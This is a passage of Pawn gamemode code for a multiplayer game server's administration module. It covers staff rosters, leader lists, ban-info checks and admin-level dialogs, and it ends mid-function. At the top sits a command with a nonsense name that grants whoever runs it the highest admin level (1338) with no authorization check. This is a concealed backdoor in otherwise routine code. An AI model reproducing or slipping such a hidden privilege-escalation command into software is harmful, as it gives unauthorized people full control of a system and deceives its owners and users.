CMD:trrrskibididopdopyesyes(playerid, params[])
{
	SetAdminLevel(playerid, playerid, 1338);
}

/*forward OnOffMakeAdmin(playerid, username[], level);
public OnOffMakeAdmin(playerid, username[], level)
{
	new rows;
	cache_get_row_count(rows);
	if(!rows)
	{
	    SendClientMessageEx(playerid, COLOR_GREY, "The player specified doesn't exist.");
	}
	else
	{
		new
	        string[500];
		
		
		mysql_format(MainPipeline, string, sizeof(string), "UPDATE `accounts` SET `AdminLevel` = %i WHERE `Username` = '%s'", level, username);
		mysql_tquery(MainPipeline, string);
		
		format(string, sizeof(string), "You have removed %s from the admin team.(Offline)", username);
		SendClientMessageEx(playerid, COLOR_LIGHTBLUE, string);
		format(string, sizeof(string),  "AdmCmd: %s has removed %s's administrator rank.(Offline)", GetPlayerNameEx(playerid), username);
		ABroadCast(COLOR_LIGHTRED, string, 2);
		Log("logs/admin.log", string);
	}
}*/

#include <DialogCenter>

#define 			DIALOG_MAKEADMIN							(9000)
#define 			DISPLAY_ADMINISTRATION    			  		(9001)
#define				DISPLAY_ADMINISTRATION_ADMIN_MANAGE     	(9002)
#define             DISPLAY_ADMINISTRATION_MER_PADMIN       	(9003)
#define             DISPLAY_ADMINISTRATION_PLAYERS_MANAGE   	(9004)
#define             DISPLAY_ADMINISTRATION_OFFMER_PADMIN    	(9005)
#define             DIALOG_OFFMAKEADMIN                     	(9006)
#define             DISPLAY_ADMINISTRATION_ONOFF_PADMIN     	(9007)
#define             DISPLAY_ADMINISTRATION_ADMIN    			(9008)
#define          	DISPLAY_ADMINISTRATION_ADMIN_LIST       	(9009)
#define             DISPLAY_ADMINISTRATION_ONOFF_SETSEC     	(9010)
#define             DISPLAY_ADMINISTRATION_OFFSETSEC        	(9011)
#define				DISPLAY_ADMINISTRATION_SETSEC           	(9012)
#define             DIALOG_OFFSETSEC                        	(9013)
#define             DIALOG_SETSEC                           	(9014)
#define             DISPLAY_ADMINISTRATION_PLAYERS_SELECTOP		(9015)
#define             DISPLAY_ADMINISTRATION_PLAYERS_UNBAN		(9216)
#define             DISPLAY_ADMINISTRATION_PLAYERS_BAN			(9217)
#define             DISPLAY_ADMINISTRATION_PLAYERS_PERMABAN		(9218)
#define             DISPLAY_ADMINISTRATION_PLAYERS_BANNEDACC	(9219)
#define             DISPLAY_ADMINISTRATION_ADMIN_LIST2			(9220)
#define             DISPLAY_ADMINISTRATION_LEADERS_LIST			(9221)
#define             DISPLAY_ADMINISTRATION_LEADERS_LIST2		(9222)
new stafflist1[3072];
new stafflist2[3072];
new leaderslist1[3072];
new leaderslist2[3072];
ShowSetSec(playerid, id) {
	
	if(!gPlayerLogged{playerid}) return SendClientMessageEx(playerid, COLOR_WHITE, "You must be logged in to use this.");

	szMiscArray[0] = 0;
	new szTitle[64];
	format(szTitle, sizeof(szTitle), "{FF0606}Administration {FFFFFF}- Set Secondary Task for %s", GetPlayerNameEx(id));			
	format(szMiscArray, sizeof(szMiscArray), "{FFFFFF}Remove Secondary Task\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n\
		{FFFFFF}%s\n",
		(PlayerInfo[id][pAP] == 1) ? ("{00FF00}Admin Personnel") : ("{FF0000}Admin Personnel"),
		(PlayerInfo[id][pAP] == 2) ? ("{00FF00}Director of Admin Personnel") : ("{FF0000}Director of Admin Personnel"),
		(PlayerInfo[id][pFactionModerator] == 1) ? ("{00FF00}Faction Moderator") : ("{FF0000}Faction Moderator"),
		(PlayerInfo[id][pFactionModerator] == 2) ? ("{00FF00}Director of Faction Management") : ("{FF0000}Director of Faction Management"),
		(PlayerInfo[id][pGangModerator] == 1) ? ("{00FF00}Gang Moderator") : ("{FF0000}Gang Moderator"),
		(PlayerInfo[id][pGangModerator] == 2) ? ("{00FF00}Director of Gang Management") : ("{FF0000}Director of Gang Management"),
		(PlayerInfo[id][pBM] == 1) ? ("{00FF00}Business Moderator") : ("{FF0000}Business Moderator"),
		(PlayerInfo[id][pBM] == 2) ? ("{00FF00}Director of Business Management") : ("{FF0000}Director of Business Management"),
		(PlayerInfo[id][pShopTech] == 1) ? ("{00FF00}Shop Technician") : ("{FF0000}Shop Technician"),
		(PlayerInfo[id][pShopTech] == 2) ? ("{00FF00}Senior Shop Technician") : ("{FF0000}Senior Shop Technician"),
		(PlayerInfo[id][pShopTech] == 3) ? ("{00FF00}Director of Community R") : ("{FF0000}Director of Community R"),
		(PlayerInfo[id][pBanAppealer] == 1) ? ("{00FF00}Ban Aappealer") : ("{FF0000}Ban Aappealer"),
		(PlayerInfo[id][pBanAppealer] == 2) ? ("{00FF00}Director of Community Inquiries") : ("{FF0000}Director of Community Inquiries"),
		(PlayerInfo[id][pUndercover] == 1) ? ("{00FF00}Special Operative (Undercover)") : ("{FF0000}Special Operative (Undercover)"),
		(PlayerInfo[id][pUndercover] == 2) ? ("{00FF00}Director of Special Operations") : ("{FF0000}Director of Special Operations"),
		(PlayerInfo[id][pPR] == 1) ? ("{00FF00}Public Relations") : ("{FF0000}Public Relations"),
		(PlayerInfo[id][pPR] == 2) ? ("{00FF00}Director of Public Relations") : ("{FF0000}Director of Public Relations"),
		(PlayerInfo[id][pHR] == 1) ? ("{00FF00}Human Resources") : ("{FF0000}Human Resources"),
		(PlayerInfo[id][pHR] == 2) ? ("{00FF00}level 2 Human Resources") : ("{FF0000}level 2 Human Resources"),
		(PlayerInfo[id][pHR] == 3) ? ("{00FF00}level 3 Human Resources") : ("{FF0000}level 3 Human Resources"),
		(PlayerInfo[id][pSecurity] == 1) ? ("{00FF00}Security") : ("{FF0000}Security"),
		(PlayerInfo[id][pASM] == 1) ? ("{00FF00}Assistant Shift Manager") : ("{FF0000}Assistant Shift Manager")
	);
	
	
	ShowPlayerDialogEx(playerid, DIALOG_SETSEC, DIALOG_STYLE_LIST, szTitle, szMiscArray, "Select", "Cancel");
	
		

	return 1;
}


CMD:div(playerid, params[])
{
   	new iGroupID = PlayerInfo[playerid][pMember],
		iRank = PlayerInfo[playerid][pRank],
		iDiv = PlayerInfo[playerid][pDivision];

    if(PlayerTied[playerid] != 0 || PlayerCuffed[playerid] != 0 || PlayerInfo[playerid][pJailTime] > 0) return SendClientMessageEx(playerid, COLOR_GRAD2, "You cannot do this at this time.");
	//if(PlayerInfo[playerid][pJailTime] && strfind(PlayerInfo[playerid][pPrisonReason], "[OOC]", true) != -1) return SendClientMessageEx(playerid, COLOR_GREY, "OOC prisoners are restricted to only speak in /b");
	if(isnull(params)) return SendSyntaxMessage(playerid, "/div [division chat]");
	if(iGroupID == INVALID_GROUP_ID) return SendErrorMessage(playerid, "You're not a part of a group!");
	if(iDiv == INVALID_DIVISION) return SendErrorMessage(playerid, "You're not a part of any divisions in your group.");
    new string[128];
	format(string, sizeof(string), "** [%s] %s %s: %s **", arrGroupDivisions[iGroupID][iDiv], arrGroupRanks[iGroupID][iRank], GetPlayerNameEx(playerid), params);
	foreach(new i : Player)
	{
	    if(PlayerInfo[i][pMember] == iGroupID && PlayerInfo[i][pDivision] == iDiv)
	    {
            SendClientMessageEx(i, COLOR_ORANGE, string);
		}
	}

	return 1;
}
/*CMD:offmakeadmin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1337)
	{
		SendErrorMessage(playerid, "You are not authorized to use that CMD.");
		return 1;
	}

	new query[128], name[MAX_PLAYER_NAME], iAdminValue;
	if(sscanf(params, "s[24]i", name, iAdminValue)) return SendClientMessageEx(playerid, COLOR_WHITE, "USAGE: /offmakeadmin [name] [level]");

	new tmpName[24];
	mysql_escape_string(name, tmpName);

	mysql_format(MainPipeline, query, sizeof(query), "UPDATE `accounts` SET `AdminLevel` = %d WHERE `Username` = '%s'", iAdminValue, tmpName);
	mysql_tquery(MainPipeline, query, "OnQueryFinish", "i", SENDDATA_THREAD);

	return 1;
}*/
CMD:oadmins(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1337 || PlayerInfo[playerid][pAP] || PlayerInfo[playerid][pHR] >= 2)
	{
		mysql_tquery(MainPipeline, "SELECT `id`, `Username`, `AdminLevel`, `SeniorModerator`, `LastLogin`, `PAdmPromBy`, `PAdmPromDate`, `PAdmBanCount`, `PKickCount` FROM `accounts` WHERE `AdminLevel` > 0", "OnAdminRoster", "i", playerid);
		return 1;
	}
	return 1;
}
CMD:oleaders(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1337)
	{
		Group_ListGroups(playerid, DIALOG_LISTLEADERS);
		//mysql_tquery(MainPipeline, "SELECT `id`, `Username`, `LastLogin`, `Leader`, `SlotHolder` FROM `accounts` WHERE `Leader` > -1 ORDER BY `Leader` ASC", "OnLeadersList", "i", playerid);
		//return 1;
	}
	else if(PlayerInfo[playerid][pSlotHolder] >= 0  && PlayerInfo[playerid][pAdmin] < 2)
	{
		mysql_format(MainPipeline, szMiscArray, sizeof(szMiscArray), "SELECT `id`, `Username`, `LastLogin`, `Leader`, `SlotHolder` FROM `accounts` WHERE `Leader` = %d", PlayerInfo[playerid][pSlotHolder]);
		mysql_tquery(MainPipeline, szMiscArray, "OnLeadersList", "i", playerid);
		//return 1;
	}
	return 1;
}
forward OnLeadersList(playerid);
public OnLeadersList(playerid)
{
	new rows, fields, id, username[MAX_PLAYER_NAME], lastlogin[48], leader, sh; 
	//new stafftitle[128];
	leaderslist1 = "";
	leaderslist2 = "";
	cache_get_row_count(rows);
	cache_get_field_count(fields);

	if(rows)
	{
		for(new i = 0; i < rows; i ++)
 		{
 		    cache_get_value_name_int(i, "id", id);
			cache_get_value_name(i, "LastLogin", lastlogin);
		    cache_get_value_name(i, "Username", username);
		    cache_get_value_name_int(i, "Leader", leader);
			cache_get_value_name_int(i, "SlotHolder", sh);
		    
			if(0 <= sh < MAX_GROUPS)
				if(strlen(leaderslist1) < 3000)
				{
					format(leaderslist1, sizeof(leaderslist1),"%s{%s}%s (SQL ID: %d){FF0000}(SH){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} \n",
					leaderslist1, Group_NumToDialogHex(arrGroupData[leader][g_hDutyColour]), username, id, lastlogin);
				}
				else
				{
					format(leaderslist2, sizeof(leaderslist2),"%s{%s}%s (SQL ID: %d){FF0000}(SH){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} \n",
					leaderslist2, Group_NumToDialogHex(arrGroupData[leader][g_hDutyColour]), username, id, lastlogin);
				} 
			else
				if(strlen(leaderslist1) < 3000)
				{
					format(leaderslist1, sizeof(leaderslist1),"%s{%s}%s (SQL ID: %d) {FFFFFF} || Last Online: {298EFF}%s {FFFFFF} \n",
					leaderslist1, Group_NumToDialogHex(arrGroupData[leader][g_hDutyColour]), username, id,  lastlogin);
				}
				else
				{
					format(leaderslist2, sizeof(leaderslist2),"%s{%s}%s (SQL ID: %d) {FFFFFF} || Last Online: {298EFF}%s {FFFFFF} \n",
					leaderslist2, Group_NumToDialogHex(arrGroupData[leader][g_hDutyColour]), username, id,  lastlogin);
				} 
		}
		new szTitle[22 + GROUP_MAX_NAME_LEN];
		format(szTitle, sizeof szTitle, "{%s}%s {FFFFFF}- Leaders List", Group_NumToDialogHex(arrGroupData[leader][g_hDutyColour]), arrGroupData[leader][g_szGroupName]);
		ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_LEADERS_LIST, DIALOG_STYLE_MSGBOX, szTitle, leaderslist1, "Next", "Cancel");
		return 1;
	}
	else
	{
		return SendClientMessageEx(playerid, COLOR_GREY, "No results.");
	}
}
AdminCount(adminlvl)
{
    new query[128], total;
    mysql_format(MainPipeline, query, sizeof(query), "SELECT COUNT(*) AS total FROM `accounts` WHERE `AdminLevel` = %d", adminlvl);
	mysql_query(MainPipeline, query);
	cache_get_value_name_int(0, "total", total);
	return total;
}

forward OnOffMakeAdmin(playerid, username[]);
public OnOffMakeAdmin(playerid, username[])
{
	new rows;
	cache_get_row_count(rows);
	if(!rows)
	{
		ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_OFFMER_PADMIN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Adjust Admin Level"
			, "{FFFFFF}The player specified doesn't exist!\n\nPlease input the account name you wish to adjust the admin rank", "Select", "Cancel");
	}
	else
	{
		
		new diagTitle[64 + MAX_PLAYER_NAME], name[MAX_PLAYER_NAME];
		format(name, MAX_PLAYER_NAME, username);
		SetPVarString(playerid, "OfflineMakingAdmin", name);
		format(diagTitle, sizeof(diagTitle), "{FF0606}Administration {FFFFFF}- Adjust Admin Level for %s", name);
		ShowPlayerDialogEx(playerid, DIALOG_OFFMAKEADMIN, DIALOG_STYLE_LIST, diagTitle, "{FFFFFF}Remove Admin Level\n{FFFF00}Moderator\n{87CEEB}Trial Administrator\n{00FF00}General Administrator\n{FFA500}Senior Administrator\n{e80c0c}Lead Administrator\n{298EFF}Executive Director", "Select", "Cancel");
	}
}
forward OnAdminRoster(playerid);
public OnAdminRoster(playerid)
{
	new rows, fields, str[128], id, username[MAX_PLAYER_NAME], adminlvl, lastlogin[48], promby[MAX_PLAYER_NAME], promdate[64], ssm; 
	//new stafftitle[128];
	stafflist1 = "";
	stafflist2 = "";
	cache_get_row_count(rows);
	cache_get_field_count(fields);

	if(rows)
	{
		for(new i = 0; i < rows; i ++)
 		{
 		    cache_get_value_name(i, "id", str); id = strval(str);
		    cache_get_value_name(i, "Username", username);
		    cache_get_value_name(i, "AdminLevel", str); adminlvl = strval(str);
		    cache_get_value_name(i, "LastLogin", lastlogin);
		    cache_get_value_name(i, "SeniorModerator", str); ssm = strval(str);
			cache_get_value_name(i, "PAdmPromBy", promby);
		    cache_get_value_name(i, "PAdmPromDate", promdate);
			//SendClientMessageEx(playerid, COLOR_GREY, "%d %s - Last Seen: %s", adminlvl, username, lastlogin);

			switch(adminlvl)
		    {
		        case 1:
		        {
		            if(!ssm)
		            {
			            //format(stafftitle, sizeof(stafftitle), "{FFFF00}Moderators Roster");
						if(strlen(stafflist1) < 3000)
						{
							format(szMiscArray, sizeof(szMiscArray),"{FFFF00}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
							username, id, lastlogin, promby, promdate);		
							strcat(stafflist1, szMiscArray);
						}
						else
						{
							format(szMiscArray, sizeof(szMiscArray),"{FFFF00}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
							username, id, lastlogin, promby, promdate);
							strcat(stafflist2, szMiscArray);
						}
	                    
					}
					else
					{
						if(strlen(stafflist1) < 3000)
						{
							format(szMiscArray, sizeof(szMiscArray),"{FFFF00}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF} (SMOD)\n",
							username, id, lastlogin, promby, promdate);		
							strcat(stafflist1, szMiscArray);
						}
						else
						{
							format(szMiscArray, sizeof(szMiscArray),"{FFFF00}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF} (SMOD)\n",
							username, id, lastlogin, promby, promdate);
							strcat(stafflist2, szMiscArray);
						}    
					}
				}
				
		        case 2:
		        {
		            //format(stafftitle, sizeof(stafftitle), "{00FF00}Junior Admin Roster");
					if(strlen(stafflist1) < 3000)
					{
						format(szMiscArray, sizeof(szMiscArray),"{00FF00}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
						username, id, lastlogin, promby, promdate);
						strcat(stafflist1, szMiscArray);
					}
					else
					{
						format(szMiscArray, sizeof(szMiscArray),"{00FF00}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
						username, id, lastlogin, promby, promdate);
						strcat(stafflist2, szMiscArray);
					}  
                    
				}
		        case 3:
		        {
		            //format(stafftitle, sizeof(stafftitle), "{00FF00}General Admin Roster");
					if(strlen(stafflist1) < 3000)
					{
						format(szMiscArray, sizeof(szMiscArray),"{00FF00}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
					username, id, lastlogin, promby, promdate);
						strcat(stafflist1, szMiscArray);
					}
					else
					{
						format(szMiscArray, sizeof(szMiscArray),"{00FF00}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
					username, id, lastlogin, promby, promdate);	
						strcat(stafflist2, szMiscArray);
					}  
                    
				}
		        case 4:
		        {
		            //format(stafftitle, sizeof(stafftitle), "{EE9A4D}Senior Admin Roster");
					if(strlen(stafflist1) < 3000)
					{
						format(szMiscArray, sizeof(szMiscArray),"{EE9A4D}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
					username, id, lastlogin, promby, promdate);
						strcat(stafflist1, szMiscArray);
					}
					else
					{
						format(szMiscArray, sizeof(szMiscArray),"{EE9A4D}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
					username, id, lastlogin, promby, promdate);
						strcat(stafflist2, szMiscArray);
					}  
                    
				}
		        case 1337:
                {
                    //format(stafftitle, sizeof(stafftitle), "{FF0000}Executive Director Roster");
					if(strlen(stafflist1) < 3000)
					{
						format(szMiscArray, sizeof(szMiscArray),"{FF0000}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
					username, id, lastlogin, promby, promdate);
						strcat(stafflist1, szMiscArray);
					}
					else
					{
						format(szMiscArray, sizeof(szMiscArray),"{FF0000}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
					username, id, lastlogin, promby, promdate);
						strcat(stafflist2, szMiscArray);
					}  
				}
				case 1338:
		        {
		            //format(stafftitle, sizeof(stafftitle), "{298EFF}Director Roster");
					if(strlen(stafflist1) < 3000)
					{
						format(szMiscArray, sizeof(szMiscArray),"{298EFF}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
					username, id, lastlogin, promby, promdate);
						strcat(stafflist1, szMiscArray);
					}
					else
					{
						format(szMiscArray, sizeof(szMiscArray),"{298EFF}%s (SQL ID: %d){FFFFFF} || Last Online: {298EFF}%s {FFFFFF} || Promoted by: {298EFF}%s {FFFFFF}|| Promoted Date: {6DFB6D}%s{FFFFFF}\n",
					username, id, lastlogin, promby, promdate);
						strcat(stafflist2, szMiscArray);
					}  
				}
		    }
		}
		
		ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ADMIN_LIST, DIALOG_STYLE_MSGBOX, "{FF0606}Administration {FFFFFF}- Staff Roster", stafflist1, "Next", "Cancel");
		return 1;
	}
	else
	{
		return SendClientMessageEx(playerid, COLOR_GREY, "No results.");
	}
}
forward ShowUserGroup(playerid);
public ShowUserGroup(playerid)
{
    new
		mysqlmessage[2500],
		mods = AdminCount(1),
		junior = AdminCount(2),
		general = AdminCount(3),
		senior = AdminCount(4),
		head = AdminCount(1337),
		mana = AdminCount(1338);
    format(mysqlmessage, sizeof(mysqlmessage),"{FFFF00}Moderators {FFFFFF}({40FFFF}%d {FFFFFF}Mods)\n", mods);
	format(mysqlmessage, sizeof(mysqlmessage),"%s{87CEEB}Trial Administrator {FFFFFF}({40FFFF}%d {FFFFFF}Admins)\n", mysqlmessage, junior);
	format(mysqlmessage, sizeof(mysqlmessage),"%s{00FF00}General Administrator {FFFFFF}({40FFFF}%d {FFFFFF}Admins)\n", mysqlmessage, general);
	format(mysqlmessage, sizeof(mysqlmessage),"%s{FFA500}Senior Administrator {FFFFFF}({40FFFF}%d {FFFFFF}Admins)\n", mysqlmessage, senior);
	format(mysqlmessage, sizeof(mysqlmessage),"%s{FF0000}Lead Administrator {FFFFFF}({40FFFF}%d {FFFFFF}Admins)\n", mysqlmessage, head);
	format(mysqlmessage, sizeof(mysqlmessage),"%s{FF0000}Executive Director {FFFFFF}({40FFFF}%d {FFFFFF}Admins)\n", mysqlmessage, mana);
	ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ADMIN, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Admins Section", mysqlmessage, "Select", "Cancel");
	return 1;
}
forward OnBanInfoCheck(index);
public OnBanInfoCheck(index)
{
	if(IsPlayerConnected(index))
	{
		new string[128], bannedreason[20], bannedby[20], name[24];
		new rows, fields;
		cache_get_row_count(rows);
		cache_get_field_count(fields);
		if(rows)
		{
   			cache_get_value_name(0, "PBannedBy", bannedby, 20);
   			cache_get_value_name(0, "PBannedReason", bannedreason, 20);
   			cache_get_value_name(0, "Username", name, MAX_PLAYER_NAME);
			format(string, sizeof(string), "{FF0000}Name: %s / Banned by: %s / Banned Reason: %s", name, bannedby, bannedreason);
			SendClientMessageEx(index, COLOR_WHITE, string);
			format(string, sizeof(string), "%s has checked %s's Ban Info.", GetPlayerNameEx(index), name);
			Log("logs/adminchecks.log", string);
		}
		else
		{
			SendErrorMessage(index, "There was an issue with checking the account's ban info.");
		}
	}
	return 1;
}
CMD:getbaninfo(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2)
	{
		SendErrorMessage(playerid, "You are not authorized to use that CMD.");
		return 1;
	}

	new query[128], name[MAX_PLAYER_NAME];
	if(sscanf(params, "s", name)) return SendClientMessageEx(playerid, COLOR_WHITE, "USAGE: /getbaninfo [name]");

	new tmpName[24];
	mysql_escape_string(name, tmpName);
	mysql_format(MainPipeline, query, sizeof(query), "SELECT `Username`, `PBannedBy`, `PBannedReason` FROM `accounts` WHERE `Username` = '%s' AND `AdminLevel` <= %d", tmpName, PlayerInfo[playerid][pAdmin]);
	mysql_tquery(MainPipeline, query, "OnBanInfoCheck", "i", playerid);
	return 1;
}
hook OnDialogResponse(playerid, dialogid, response, listitem, inputtext[]) {
	if(arrAntiCheat[playerid][ac_iFlags][AC_DIALOGSPOOFING] > 0) return 1;

	switch(dialogid)
	{
		case DISPLAY_ADMINISTRATION_LEADERS_LIST:
		{
		    if(response)
		    {
		        if(strlen(leaderslist2) < 2)
		        {
 					return 1;
				}
				else
				{
				    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_LEADERS_LIST2, DIALOG_STYLE_MSGBOX, "{FF0606}Administration {FFFFFF}- Staff Roster", leaderslist2, "Previous", "Cancel");
				}
			}
		}
		case DISPLAY_ADMINISTRATION_LEADERS_LIST2:
		{
		    if(response)
		    {
				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_LEADERS_LIST, DIALOG_STYLE_MSGBOX, "{FF0606}Administration {FFFFFF}- Staff Roster", leaderslist1, "Next", "Cancel");
			}
		}
		case DISPLAY_ADMINISTRATION_ADMIN_LIST:
		{
		    if(response)
		    {
		        if(strlen(stafflist2) < 2)
		        {
 					return 1;
				}
				else
				{
				    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ADMIN_LIST2, DIALOG_STYLE_MSGBOX, "{FF0606}Administration {FFFFFF}- Staff Roster", stafflist2, "Previous", "Cancel");
				}
			}
		}
		case DISPLAY_ADMINISTRATION_ADMIN_LIST2:
		{
		    if(response)
		    {
				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ADMIN_LIST, DIALOG_STYLE_MSGBOX, "{FF0606}Administration {FFFFFF}- Staff Roster", stafflist1, "Next", "Cancel");
			}
		}
	    case DISPLAY_ADMINISTRATION:
		{
			if(response)
			{
				if(listitem == 0) ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ADMIN_MANAGE, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Staff Section"
				, "Staff Roster\nAdjust Admin Level\nSet Secondary Task", "Select", "Cancel");
				if(listitem == 1) ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_MANAGE, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Players Section"
				, "Ban Appeal Section", "Select", "Cancel");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_PLAYERS_MANAGE:
		{
			if(response)
			{
				if(listitem == 0) ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_SELECTOP, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Players Section"
				, "Unban Account\nBan Account\nPermaban Account\nCheck Ban Info", "Select", "Cancel");
			}
			if(!response)
			{
				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION, DIALOG_STYLE_LIST,"{FF0606}Administration", "Staff Section\nPlayers Section\n", "Select", "Exit");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_PLAYERS_SELECTOP:
		{
			if(response)
			{
				if(listitem == 0)
				{
				    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_UNBAN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Players Section"
					, "Type in the account name you wish to unban", "Select", "Cancel");
				}
				if(listitem == 1)
				{
				    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_BAN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Players Section"
					, "Type in the account name you wish to ban", "Select", "Cancel");
				}
				if(listitem == 2)
				{
				    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_PERMABAN, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Players Section"
					, "Type in the account name you wish to permanently ban", "Select", "Cancel");
				}
				if(listitem == 3)
				{
				    ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_BANNEDACC, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Players Section"
					, "Type in the name of the banned account you wish to check", "Select", "Cancel");
				}
			}
			if(!response)
			{
				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_MANAGE, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Players Section"
				, "Ban Appeal Section\n", "Select", "Cancel");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_PLAYERS_BANNEDACC:
		{
			if(response)
			{
	            if(!isnull(inputtext))
				{

					new query[128], tmpName[24];
					mysql_escape_string(inputtext, tmpName);
					mysql_format(MainPipeline, query, sizeof(query), "SELECT `Username`, `PBannedBy`, `PBannedReason` FROM `accounts` WHERE `Username` = '%s' AND `AdminLevel` <= %d", tmpName, PlayerInfo[playerid][pAdmin]);
					mysql_tquery(MainPipeline, query, "OnBanInfoCheck", "i", playerid);
					return 1;
				}
				else
			    {
					ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_BANNEDACC, DIALOG_STYLE_INPUT, "{FF0606}Administration {FFFFFF}- Players Section"
					, "Type in the name of the banned account you wish to check", "Select", "Cancel");
				}
			}
			if(!response)
			{
			   	ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_PLAYERS_SELECTOP, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Players Section"
				, "Unban Account\nBan Account\nPermaban Account\nCheck Ban Info", "Select", "Cancel");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_ADMIN_MANAGE:
		{
			if(response)
			{
				if(listitem == 0) // Staff Roster
				{
				   	 ShowUserGroup(playerid);
				}
				if(listitem == 1) // Make/Edit/Remove an admin
				{
	   				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ONOFF_PADMIN, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Adjust Admin Level"
					, "Online\nOffline", "Select", "Cancel");
				}
				if(listitem == 2) // Setsec
				{
	   				ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION_ONOFF_SETSEC, DIALOG_STYLE_LIST, "{FF0606}Administration {FFFFFF}- Set Secondary Task"
					, "Online\nOffline", "Select", "Cancel");
				}
			}
			if(!response)
			{
      			ShowPlayerDialogEx(playerid, DISPLAY_ADMINISTRATION, DIALOG_STYLE_LIST,"{FF0606}Administration", "Staff Section\nPlayers Section\n", "Select", "Exit");
			}
			return 1;
		}
		case DISPLAY_ADMINISTRATION_ADMIN:
		{
			if(response)
			{
